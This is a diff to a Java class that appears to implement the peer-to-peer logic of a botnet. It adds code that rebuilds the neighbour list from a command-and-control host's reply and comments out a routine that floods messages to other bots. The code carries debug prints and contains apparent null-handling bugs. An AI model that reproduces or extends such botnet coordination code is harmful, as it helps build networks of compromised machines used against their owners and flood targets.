@@ -87,11 +87,28 @@ public class Behavior {
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
 		List<Pairs<String, String>> response = null;
 		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data);
+		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
+		
 		if (response != null) {
 			response.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
 		} else
 			System.out.println("torno null");
+		
+		for (Pairs<String, String> pairs : response) {
+			Pairs<IP,PublicKey> in=new Pairs<IP,PublicKey>();
+			in.setValue1(new IP(pairs.getValue1()));
+			in.setValue2(pki.rebuildPuK(pairs.getValue2()));
+			newNeighbours.add(in);
+		}
+		
+		if (newNeighbours != null) {
+			newNeighbours.forEach(ob -> System.out.println("torno2 " + ob.getValue1().toString()));
+		} else
+			System.out.println("torno null");
+	
 
+		nServ.getNeighbours().setAll(newNeighbours);
+		
 	}
 
 	/**
@@ -205,16 +222,12 @@ public class Behavior {
 		for (Pairs<IP, PublicKey> p : nServ.getNeighbours().getList()) {
 			//IP test = p.getValue1();
 			Object x=p.getValue1();
-			System.out.println("dasdsa "+x.toString());
 			IP test = new IP(x.toString());
-			System.out.println("dsasaddavvvvvv "+test.getIp());
-			
-			System.out.println("vicino " + nServ.getNeighbours().getList().get(1).getValue1().getIp());
-			
-			if (!ip.equals(test)) {
-				req.sendFloodToOtherBot(p.getValue1(), msg);
-				System.out.println("flood vicino "+ test);
-			}
+			System.out.println("dsasaddavvvvvv "+test.getIp());			
+//			if (!ip.equals(test)) {
+//				req.sendFloodToOtherBot(p.getValue1(), msg);
+//				System.out.println("flood vicino "+ test);
+//			}
 		}
 
 		// nServ.getNeighbours().getList().forEach((pairs) -> {
